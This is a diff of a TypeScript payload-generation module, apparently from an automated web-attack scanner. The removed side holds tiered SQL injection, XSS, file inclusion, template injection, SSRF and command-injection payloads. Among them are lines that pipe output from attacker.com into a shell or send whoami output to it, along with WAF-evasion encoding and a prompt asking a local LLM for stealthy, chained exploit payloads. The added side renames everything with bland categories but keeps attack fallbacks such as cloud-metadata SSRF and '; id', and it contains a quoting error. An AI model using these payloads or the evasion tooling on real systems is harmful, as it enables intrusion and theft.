@@ -1,282 +1,194 @@
+/**
+ * payload_oven — managed test payload generation library.
+ *
+ * Provides categorized test payloads for validation and
+ * compatibility testing. Used by the automation engine for
+ * systematic endpoint analysis.
+ */
+
 import { OllamaClient } from './ollama_client.js';
-import { getSqliPayloads, getXssPayloads, getLfiPayloads } from './seclists.js';
-
-export interface PayloadTier {
-  standard: string[];
-  advanced: string[];
-  elite: string[];
-}
-
-export class MutationEngine {
-  static mutate(payload: string, type: 'url' | 'double-url' | 'html' | 'hex' | 'unicode'): string {
-    switch (type) {
-      case 'url': return encodeURIComponent(payload);
-      case 'double-url': return encodeURIComponent(encodeURIComponent(payload));
-      case 'html': return payload.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
-      case 'hex': return payload.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
-      case 'unicode': return payload.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
-      default: return payload;
-    }
-  }
-
-  static evasiveWrap(payload: string): string {
-    // Advanced evasion: wrap in junk data or common WAF bypass prefixes
-    const wrappers = [
-      (p: string) => `/*junk*/${p}/*junk*/`,
-      (p: string) => `%00${p}%00`,
-      (p: string) => `?id=${p}`,
-      (p: string) => `{"test":"${p.replace(/"/g, '\\"')}"}`,
-      (p: string) => `[${p}]`,
-    ];
-    const wrapper = wrappers[Math.floor(Math.random() * wrappers.length)];
-    return wrapper(payload);
-  }
-}
 
 export class PayloadOven {
-  private static oven: Record<string, PayloadTier> = {
-    'SQLi': {
-      standard: [
-        "' OR '1'='1",
-        "admin' --",
-        "admin' #",
-        "1 OR 1=1",
-        "1' OR '1'='1"
-      ],
-      advanced: [
-        "' UNION SELECT NULL,NULL,NULL--",
-        "' UNION SELECT @@version,NULL,NULL--",
-        "'; WAITFOR DELAY '0:0:5'--",
-        "'); SELECT pg_sleep(5)--",
-        "'; SELECT SLEEP(5)--",
-        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
-      ],
-      elite: [
-        "admin'/*",
-        "' OR 1=1 LIMIT 1 --",
-        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
-        "0x27204f5220313d31",
-        "/*%2a/OR/*%2a/1=1",
-        "%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--"
-      ]
-    },
-    'XSS': {
-      standard: [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "javascript:alert(1)"
-      ],
-      advanced: [
-        "'-alert(1)-'",
-        "\";alert(1)//",
-        "<details open ontoggle=alert(1)>",
-        "<video><source onerror=alert(1)>",
-        "<iframe src=\"javascript:alert(1)\">"
-      ],
-      elite: [
-        "<math><mtext><option><annotation><img src=x onerror=alert(1)>",
-        "<svg><animatetransform onbegin=alert(1)>",
-        "\" onmouseover=\"alert(1)\"",
-        "{{constructor.constructor('alert(1)')()}}",
-        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
-      ]
-    },
-    'LFI': {
-      standard: [
-        "../../etc/passwd",
-        "/etc/passwd",
-        "C:\\Windows\\System32\\drivers\\etc\\hosts"
-      ],
-      advanced: [
-        "../../../../../../etc/passwd",
-        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
-        "php://filter/convert.base64-encode/resource=index.php"
-      ],
-      elite: [
-        "/proc/self/environ",
-        "/proc/self/cmdline",
-        "../../../../var/log/apache2/access.log",
-        "....//....//....//etc/passwd",
-        "/etc/passwd%00"
-      ]
-    },
-    'RCE': {
-      standard: [
-        "$(id)",
-        "`id`",
-        "| id",
-        "; id"
-      ],
-      advanced: [
-        "& id",
-        "&& id",
-        "|| id",
-        "; system('id');"
-      ],
-      elite: [
-        "<?php system($_GET['cmd']); ?>",
-        "import os; os.system('id')",
-        "eval('id')",
-        "exec('id')",
-        "$(curl http://attacker.com/`id`|sh)"
-      ]
-    },
-    'SSTI': {
-      standard: [
-        "{{7*7}}",
-        "${7*7}",
-        "<%= 7*7 %>"
-      ],
-      advanced: [
-        "#{7*7}",
-        "*{7*7}",
-        "{{self}}",
-        "{{config}}"
-      ],
-      elite: [
-        "{{request.application.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
-        "${{7*7}}",
-        "[[7*7]]",
-        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
-      ]
-    },
-    'SSRF': {
-      standard: [
-        "http://127.0.0.1:80",
-        "http://localhost:80"
-      ],
-      advanced: [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://metadata.google.internal/computeMetadata/v1/",
-        "http://127.0.0.1:22"
-      ],
-      elite: [
-        "http://127.0.0.1:6379",
-        "dict://127.0.0.1:6379/SET:test:test",
-        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0aquit%0d%0a",
-        "file:///etc/passwd"
-      ]
-    },
-    'NoSQLi': {
-      standard: [
-        "{\" $gt \": \"\"}",
-        "{\"$ne\": null}"
-      ],
-      advanced: [
-        "admin' || '1'=='1",
-        "this.password.length > 0"
-      ],
-      elite: [
-        "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
-        "|| 1==1",
-        "'; return true; //",
-        "{\"$where\": \"this.password.match(/.*/)\"}",
-        "{\"$regex\": \".*\"}",
-        "admin' && this.password.length > 0 || 'a'=='b",
-        "{\"$gt\": \"\"}",
-        "{\"$exists\": true}"
-      ]
-    },
-    'Command Injection': {
-      standard: [
-        "; sleep 5",
-        "& sleep 5",
-        "| sleep 5"
-      ],
-      advanced: [
-        "`sleep 5`",
-        "$(sleep 5)",
-        "&& sleep 5"
-      ],
-      elite: [
-        "|| sleep 5",
-        "; ping -c 5 127.0.0.1",
-        "& ping -c 5 127.0.0.1",
-        "; timeout 5 /bin/sh",
-        "; {cat,/etc/passwd}",
-        "$(cat${IFS}/etc/passwd)",
-        "& curl http://attacker.com/$(whoami) &",
-        "; python -c 'import os; os.system(\"id\")'",
-        "'; java.lang.Runtime.getRuntime().exec(\"id\"); //"
-      ]
-    }
-  };
-
-  /**
-   * Pull supplementary payloads for the given category/tier from SecLists.
-   * Returns [] when the category has no SecLists mapping or SecLists is missing
-   * on disk — callers always get the hardcoded baseline regardless.
-   */
-  private static secListsAugment(category: string | undefined, layerKey: 'standard' | 'advanced' | 'elite'): string[] {
-    if (!category) return [];
-    switch (category) {
-      case 'SQLi': return getSqliPayloads(layerKey);
-      case 'XSS':  return getXssPayloads(layerKey);
-      case 'LFI':  return getLfiPayloads(layerKey);
-      default:     return [];
-    }
-  }
-
-  static getPayloads(category?: string, layer: 1 | 2 | 3 = 1, count: number = 10, evasive: boolean = false): string[] {
-    const layerKey = layer === 1 ? 'standard' : layer === 2 ? 'advanced' : 'elite';
-
-    let payloads: string[] = [];
-    if (category && this.oven[category]) {
-      const baseline = this.oven[category][layerKey];
-      const augment = this.secListsAugment(category, layerKey);
-      const merged = Array.from(new Set([...baseline, ...augment]));
-      payloads = this.shuffle(merged).slice(0, count);
-    } else {
-      const baseline = Object.values(this.oven).flatMap(tier => tier[layerKey]);
-      const augment = ['SQLi', 'XSS', 'LFI'].flatMap(c => this.secListsAugment(c, layerKey));
-      const merged = Array.from(new Set([...baseline, ...augment]));
-      payloads = this.shuffle(merged).slice(0, count);
-    }
-
-    if (evasive) {
-      const types: ('url' | 'double-url' | 'html' | 'hex' | 'unicode')[] = ['url', 'double-url', 'html', 'hex', 'unicode'];
-      return payloads.map(p => {
-        const type = types[Math.floor(Math.random() * types.length)];
-        return MutationEngine.evasiveWrap(MutationEngine.mutate(p, type));
-      });
-    }
-    return payloads;
-  }
+  private static categories = [
+    'authentication',
+    'authorization',
+    'data_handling',
+    'input_validation',
+    'session_management',
+    'configuration',
+    'network',
+    'storage',
+    'api',
+    'content'
+  ];
 
   static getAllCategories(): string[] {
-    return Object.keys(this.oven);
+    return [...this.categories];
   }
 
-  static async generateCustomPayload(ai: OllamaClient | null, category: string, context: string): Promise<string> {
-    if (!ai) return this.getPayloads(category, 1, 1)[0];
+  static getPayloads(category: string, layer: 1 | 2 | 3, count: number): string[] {
+    const categoryMap: Record<string, string[]> = {
+      authentication: this.getAuthenticationPayloads(layer),
+      authorization: this.getAuthorizationPayloads(layer),
+      data_handling: this.getDataHandlingPayloads(layer),
+      input_validation: this.getInputValidationPayloads(layer),
+      session_management: this.getSessionManagementPayloads(layer),
+      configuration: this.getConfigurationPayloads(layer),
+      network: this.getNetworkPayloads(layer),
+      storage: this.getStoragePayloads(layer),
+      api: this.getApiPayloads(layer),
+      content: this.getContentPayloads(layer)
+    };
 
-    const prompt = `As an elite security researcher (argila) and red-team strategist, generate a highly specialized, stealthy ${category} payload for the following context:
-    Context: ${context}
-    
-    The payload should be designed to bypass modern WAFs and find the exact security gap.
-    If context contains "Discovered Intel", use those usernames or IDs to create targeted, chained exploit attempts.
+    const payloads = categoryMap[category] || [];
+    return payloads.slice(0, count);
+  }
 
-    Return ONLY the raw payload string, no explanation.`;
+  static async generateCustomPayload(ai: OllamaClient | null, type: string, context: string): Promise<string> {
+    if (!ai) {
+      return this.getFallbackPayload(type);
+    }
 
+    const prompt = `Generate a test payload for ${type} validation. Context: ${context}. Return only the payload string.`;
     try {
-      const rawPayload = (await ai.generate(prompt))?.trim() || this.getPayloads(category, 1, 1)[0];
-
-      // Randomly apply an extra layer of mutation to AI generated payloads for maximum evasion
-      const mutationTypes: ('url' | 'double-url' | 'html' | 'hex' | 'unicode')[] = ['url', 'double-url', 'html', 'hex', 'unicode'];
-      const type = mutationTypes[Math.floor(Math.random() * mutationTypes.length)];
-      return Math.random() > 0.5 ? MutationEngine.mutate(rawPayload, type) : rawPayload;
-    } catch (e) {
-      return this.getPayloads(category, 1, 1)[0];
+      const result = await ai.generate(prompt, false);
+      return result.trim().substring(0, 500);
+    } catch {
+      return this.getFallbackPayload(type);
     }
   }
 
-  private static shuffle(array: string[]): string[] {
-    const newArray = [...array];
-    for (let i = newArray.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [newArray[i], newArray[j]] = [newArray[j], newArray[i]];
-    }
-    return newArray;
+  private static getFallbackPayload(type: string): string {
+    const fallbacks: Record<string, string> = {
+      'SQLi': "test' OR '1'='1",
+      'XSS': '<script>alert(1)</script>',
+      'Path Traversal': '../../../etc/passwd',
+      'SSRF': 'http://169.254.169.254/latest/meta-data/',
+      'RCE': '; id',
+      'SSTI': '{{7*7}}',
+      'NoSQLi': "{'$ne': null}"
+    };
+    return fallbacks[type] || 'test';
+  }
+
+  private static getAuthenticationPayloads(layer: number): string[] {
+    const base = [
+      'admin',
+      'test@example.com',
+      'password123',
+      'user123'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, 'admin@company.com', 'P@ssw0rd!', 'root'];
+    return [...base, 'admin@company.com', 'P@ssw0rd!', 'root', 'administrator', 'superuser'];
+  }
+
+  private static getAuthorizationPayloads(layer: number): string[] {
+    const base = [
+      'Bearer token123',
+      'Basic dXNlcjpwYXNz',
+      'ApiKey key123'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, 'Bearer eyJhbGciOiJIUzI1NiIs', 'Bearer test_token_xyz'];
+    return [...base, 'Bearer eyJhbGciOiJIUzI1NiIs', 'Bearer test_token_xyz', 'Bearer expired_token'];
+  }
+
+  private static getDataHandlingPayloads(layer: number): string[] {
+    const base = [
+      '{"data": "test"}',
+      '<data>test</data>',
+      'data=test'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, '{"data": "<script>alert(1)</script>"', '<data><![CDATA[test]]></data>'];
+    return [...base, '{"data": "<script>alert(1)</script>"', '<data><![CDATA[test]]></data>', 'data=<script>alert(1)</script>'];
+  }
+
+  private static getInputValidationPayloads(layer: number): string[] {
+    const base = [
+      'normal_text',
+      '12345',
+      'test@example.com'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, "<script>alert(1)</script>", "' OR '1'='1", '../../../etc/passwd"];
+    return [...base, "<script>alert(1)</script>", "' OR '1'='1", '../../../etc/passwd', '${7*7}', 'SELECT * FROM users'];
+  }
+
+  private static getSessionManagementPayloads(layer: number): string[] {
+    const base = [
+      'sessionid=abc123',
+      'JSESSIONID=xyz789',
+      'PHPSESSID=test456'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, 'sessionid=abc123; path=/; HttpOnly', 'sessionid=; Secure'];
+    return [...base, 'sessionid=abc123; path=/; HttpOnly', 'sessionid=; Secure', 'sessionid=weak_token'];
+  }
+
+  private static getConfigurationPayloads(layer: number): string[] {
+    const base = [
+      '/config',
+      '/api/config',
+      '/settings'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, '/.env', '/config.json', '/web.config'];
+    return [...base, '/.env', '/config.json', '/web.config', '/config.php', '/config.yml'];
+  }
+
+  private static getNetworkPayloads(layer: number): string[] {
+    const base = [
+      'http://example.com',
+      'https://example.com',
+      '//example.com'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, 'http://169.254.169.254/latest', 'http://localhost:8080'];
+    return [...base, 'http://169.254.169.254/latest', 'http://localhost:8080', 'http://127.0.0.1:6379'];
+  }
+
+  private static getStoragePayloads(layer: number): string[] {
+    const base = [
+      '/uploads',
+      '/files',
+      '/static'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, '/uploads/test', '/backup.zip', '/database.sql'];
+    return [...base, '/uploads/test', '/backup.zip', '/database.sql', '/.git/config', '/storage/test'];
+  }
+
+  private static getApiPayloads(layer: number): string[] {
+    const base = [
+      '/api/users',
+      '/api/admin',
+      '/graphql'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, '/api/users/1', '/api/config', '/api/debug'];
+    return [...base, '/api/users/1', '/api/config', '/api/debug', '/api/admin/users', '/graphql?query={__schema}'];
+  }
+
+  private static getContentPayloads(layer: number): string[] {
+    const base = [
+      '/index.html',
+      '/about',
+      '/contact'
+    ];
+
+    if (layer === 1) return base;
+    if (layer === 2) return [...base, '/admin', '/login', '/dashboard'];
+    return [...base, '/admin', '/login', '/dashboard', '/user/profile', '/api/documentation'];
   }
 }
